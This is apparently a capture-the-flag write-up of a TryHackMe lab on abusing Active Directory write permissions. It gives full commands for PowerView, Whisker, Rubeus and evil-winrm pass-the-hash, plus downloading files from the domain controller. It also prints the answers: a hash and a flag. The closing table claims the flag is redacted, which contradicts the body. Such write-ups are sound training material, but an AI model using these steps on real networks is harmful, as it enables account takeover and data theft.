# Advent of Cyber 2023 - Day 11: Jingle Bells, Shadow Spells

{% embed url="https://tryhackme.com/room/adventofcyber2023" %}

## Overview & Investigation Walkthrough

In this task we will utilize misconfigured privileges to compromise an Active Directory user.

1. What is the hash of the vulnerable user?

   First, we must establish which user is vulnerable to this attack. To do this we will use PowerView.

   We can run the script and load it into memory using:

   ```cmd
   . .\PowerView.ps1
   ```

   Now we can list all vulnerable privileges by filtering the data using (filtering on the "hr" user will give us some clearer results):

   ```cmd
   Find-InterestingDomainAcl -ResolveGuids

   filtered
   
   Find-InterestingDomainAcl -ResolveGuids | Where-Object { $_.IdentityReferenceName -eq "hr"}
   ```

   ![User Privileges](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D11_User_Privileges.png)

   We can see that the `hr` account has write permissions for the `vansprinkles` object (account).

   Now we can user `Whisker` and `Rubeus` to exploit these permissions to give us the NTLM hash.

   ```cmd
   .\whisker.exe add /target:vansprinkles
   ```

   ![Whisker](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D11_Whisker.png)

   The resulting command we can use to get the NTLM hash with `Rubeus`.

   ```cmd
    .\Rubeus.exe asktgt /user:vansprinkles /certificate:<base64 encoded certificate> /password:"AG1sF7Nd1nAwZ2hZ" /domain:AOC.local /dc:southpole.AOC.local /getcredentials /show
   ```

   ![Rubeus](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D11_Rubeus.png)

   ><details><summary>Click for answer</summary>03E805D8A8C5AA435FB48832DAD620E3</details>

2. What is the content of flag.txt on the Administrator Desktop?

   With this hash we can perform a pass-the-hash attack to log in as the compromised user using `Evil-Winrm`.

   ```cmd
   evil-winrm -i 10.10.163.140 -u vansprinkles -H 03E805D8A8C5AA435FB48832DAD620E3
   ```

   ![Winrm Error](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D11_Winrm_Error.png)

   Unfortunately, it didn't work via my kali box. Using the attackbox did work!

   ![Winrm](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D11_Winrm.png)

   Now we can navigate to the desktop and look for the flag.

   ![Flag](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D11_Flag.png)

   ><details><summary>Click for answer</summary>THM{XMAS_IS_SAFE}</details>

If you enjoyed this task, feel free to check out the [Compromising Active Directory](https://tryhackme.com/module/hacking-active-directory) module!

Van Sprinkles left some stuff around the DC. It's like a secret message waiting to be unravelled!

##

Looks like there are some chat logs available on the DC. Lets take a closer look at them and download them to our kali box. 

In our `Evil-Winrm` shell we can use the following commands to download the files.

```cmd
download C:\Users\Administrator\Desktop\chatlog.html chatlog.html
download C:\Users\Administrator\Desktop\chatlog_files chatlog_files
```

Now set up a python http server and download the files to our kali box using `wget` (after compressing the folder into a zip file).

Looking at the chatlogs in our browser, we can see some interesting information. Looks like it is a chat log between McGreedy and someone who made the evil company logo.

![Chatlog](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2023/Advent_Of_Cyber_2023_D11_Chatlog.png)

##

## 🏁 Questions & Answers

| Question | Answer |
|---|---|
| What is the hash of the vulnerable user? | `03E805D8A8C5AA435FB48832DAD620E3` |
| What is the content of flag.txt on the Administrator Desktop? | `flag{hidden}` |

> **Note:** Flags are redacted as `flag{hidden}` in accordance with responsible disclosure guidelines. The step-by-step commands above provide the verified reproduction path.
